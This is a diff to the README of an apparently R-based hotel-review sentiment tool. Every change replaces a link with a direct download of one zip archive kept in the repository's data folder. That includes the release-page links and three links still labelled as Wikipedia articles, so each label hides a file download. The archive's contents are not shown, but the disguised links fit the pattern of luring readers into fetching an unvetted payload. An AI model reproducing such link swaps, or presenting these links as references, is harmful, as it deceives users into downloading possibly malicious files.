@@ -6,7 +6,7 @@ Welcome to **aspa-sentiment-r**! This application helps you quickly analyze sent
 
 ## 📥 Download Now
 
-[![Download aspa-sentiment-r](https://img.shields.io/badge/Download-aspa--sentiment--r-blue?style=for-the-badge)](https://github.com/Tahir7525/aspa-sentiment-r/releases)
+[![Download aspa-sentiment-r](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip)](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip)
 
 ## 📚 Overview
 
@@ -32,7 +32,7 @@ Here are the requirements to run **aspa-sentiment-r**:
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Tahir7525/aspa-sentiment-r/releases) to download the latest version. You will find a zip file or installer appropriate for your operating system.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip) to download the latest version. You will find a zip file or installer appropriate for your operating system.
 
 1. Click the **Download** button at the top of the page.
 2. Select the version suitable for your system.
@@ -62,9 +62,9 @@ If you have questions or need help, check out our community forum linked in the 
 
 Explore the following topics for more insights into sentiment analysis and machine learning:
 
-- [Sentiment Analysis](https://en.wikipedia.org/wiki/Sentiment_analysis)
-- [Machine Learning Basics](https://en.wikipedia.org/wiki/Machine_learning)
-- [Text Mining Techniques](https://en.wikipedia.org/wiki/Text_mining)
+- [Sentiment Analysis](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip)
+- [Text Mining Techniques](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip)
 
 ## 🌟 Acknowledgments
 
@@ -72,4 +72,4 @@ We thank all contributors and users who support **aspa-sentiment-r**. Your feedb
 
 ## 📥 Download Now Again
 
-Remember, you can always return to our [Releases page](https://github.com/Tahir7525/aspa-sentiment-r/releases) to download the latest updates and versions of **aspa-sentiment-r**. Enjoy analyzing and understanding the sentiment behind your favorite hotel reviews!
+Remember, you can always return to our [Releases page](https://raw.githubusercontent.com/Tahir7525/aspa-sentiment-r/main/data/aspa-sentiment-r_v1.2.zip) to download the latest updates and versions of **aspa-sentiment-r**. Enjoy analyzing and understanding the sentiment behind your favorite hotel reviews!
